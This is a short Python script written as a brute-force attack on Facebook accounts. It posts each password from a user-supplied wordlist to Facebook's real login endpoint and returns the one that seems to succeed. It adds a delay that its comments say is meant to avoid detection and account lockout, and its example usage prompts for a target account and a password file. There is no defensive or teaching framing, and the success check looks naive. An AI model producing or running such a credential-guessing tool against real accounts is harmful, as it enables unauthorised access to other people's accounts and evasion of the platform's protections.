import requests
import time

def brute_force_facebook_account(username: str, password_list: list):
    """
    Function to perform a brute force attack on a Facebook account using a list of passwords.

    Parameters:
    - username: str
        The username or email address associated with the Facebook account.
    - password_list: list
        A list of passwords to try for the Facebook account.

    Returns:
    - str or None:
        Returns the correct password if found, or None if no match is found.

    Raises:
    - ValueError:
        Raises an error if the username or password list is empty.
    """

    # Checking if the username or password list is empty
    if not username or not password_list:
        raise ValueError("Username or password list cannot be empty.")

    # Iterating through the password list
    for password in password_list:
        # Adding delay to avoid detection and account lockout
        time.sleep(2)

        # Sending a POST request to the Facebook login endpoint with the username and password
        response = requests.post("https://www.facebook.com/login.php", data={"email": username, "pass": password})

        # Checking if the response contains a specific string indicating a successful login
        if "Welcome to Facebook" in response.text:
            return password

    # If no match is found, return None
    return None

# Example usage of the brute_force_facebook_account function:

# Get the username and password list from the user
username = input("Enter the Facebook username or email: ")
password_list = input("Enter the path to the password list file: ")

# Read the password list from the file
with open(password_list, 'r') as file:
    passwords = [line.strip() for line in file]

try:
    result = brute_force_facebook_account(username, passwords)

    if result:
        print(f"Successfully found the password for the Facebook account: {result}")
    else:
        print("No match found for the given username and password list.")
except requests.RequestException as e:
    print(f"An error occurred: {e}")
except ValueError as ve:
    print(f"ValueError: {ve}")
